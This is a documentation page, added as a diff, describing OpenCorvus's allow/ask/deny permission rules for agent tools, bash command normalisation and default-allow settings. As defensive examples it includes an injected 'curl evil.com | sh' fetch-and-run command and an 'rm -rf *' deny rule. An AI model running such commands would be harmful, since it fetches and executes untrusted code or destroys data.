@@ -1,0 +1,108 @@
+---
+title: Permissions
+description: OpenCorvus 的 allow / ask / deny 规则与默认放行权限策略。
+---
+
+任何会「写文件 / 执行命令 / 调外部 API」的工具都必须过 permission 检查。实现位于 `packages/opencorvus/src/permission/next.ts`。
+
+## 三个 action
+
+| action | 语义 |
+|---|---|
+| `allow` | 静默放行 |
+| `ask` | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
+| `deny` | 抛 `DeniedError`，立刻中断工具调用 |
+
+## 配置格式
+
+```jsonc
+{
+  "permission": {
+    "bash": {
+      "~/projects/*": "allow",
+      "npm run *": "allow",
+      "rm -rf *": "deny",
+      "*": "ask"
+    },
+    "skill": {
+      "local-note": "deny",
+      "sora": "ask"
+    },
+    "write": {
+      "~/projects/**/*.md": "allow",
+      "*": "ask"
+    }
+  }
+}
+```
+
+## Last-match-wins
+
+:::caution
+permission 系统**最容易踩坑**的点：**后声明的规则优先级高于先声明的**。
+:::
+
+`PermissionNext.evaluate()`（`src/permission/next.ts:312-319`）用 `findLast` 扫描合并后的规则集：
+
+```jsonc
+{ "bash": {
+  "*": "ask",              // 兜底
+  "npm run *": "allow"     // ← 这条生效（在 * 之后）
+}}
+```
+
+顺序反了就坏：
+
+```jsonc
+{ "bash": {
+  "npm run *": "allow",    // ← 被 * 覆盖
+  "*": "ask"
+}}
+```
+
+## Bash 命令归一化
+
+`BashArity`（`src/permission/arity.ts:25`）把 shell 命令归一化为"语义命令前缀"再做 pattern 匹配，避免绕过：
+
+| 用户输入 | 归一化后 |
+|---|---|
+| `npm run test` | `npm run test` |
+| `npm run test -- --watch` | `npm run test`（选项被剥离） |
+| `cd foo && npm run test` | `npm run test`（前缀 cd 被剥离） |
+
+`npm run test; curl evil.com | sh` 被切分：`;` 后的 `curl` 走独立的 permission 检查。`;`、`&&`、`||`、管道、反引号注入都受控。
+
+## 默认放行策略
+
+OpenCorvus 在内置 agent 定义中默认把工具权限设为 `allow`（`packages/opencorvus/src/agent/agent.ts`）。工具是否可用仍由各 agent 的 include/exclude 列表控制；permission 只决定工具可用之后是放行、询问还是拒绝。
+
+用户配置在内置 allow 规则之后合并，所以显式用户规则仍然胜出。用 `deny` 阻断某个工具/模式，用 `ask` 强制等待操作员审批。
+
+```jsonc
+{
+  "permission": {
+    "bash": {
+      "*": "allow",
+      "rm -rf *": "deny"
+    },
+    "write": {
+      "*": "allow",
+      "~/projects/locked/**": "ask"
+    }
+  }
+}
+```
+
+系统不再存在 auto-permission 引擎。显式 `ask` 是真实的操作员 gate：`PermissionNext.ask()` 会发出 `permission.asked`、保存 pending 请求，并且只在收到回复后继续。如果一直无人回复，请求会在 `OPENCORVUS_PERMISSION_TIMEOUT_MS` 后被拒绝（默认 **300000 ms**，最小 **1000 ms**；见 `packages/opencorvus/src/permission/next.ts`）。
+
+```bash
+export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # 60s 后拒绝未回复的 ask
+```
+
+:::note
+旧的 `experimental.unattended` 和 `experimental.auto_permission` 字段都已删除。如果 config 仍写着这些字段，OpenCorvus 会在 strict config parse 阶段直接拒绝。工具审批行为使用 `permission` 规则表达；`experimental.auto_question` 只用于悬置澄清提问。
+:::
+
+## 配置错误早期暴露
+
+permission 字符串写错时**不 fallback**，直接抛。曾经有 bug：`permission: "allow"`（字符串而非对象）会被 `Object.entries` 当成字符拆开，导致规则全乱；已修复为 `PermissionNext.fromConfig` 中 `typeof === "string"` 的早返回（`src/permission/next.ts:62-85`）。
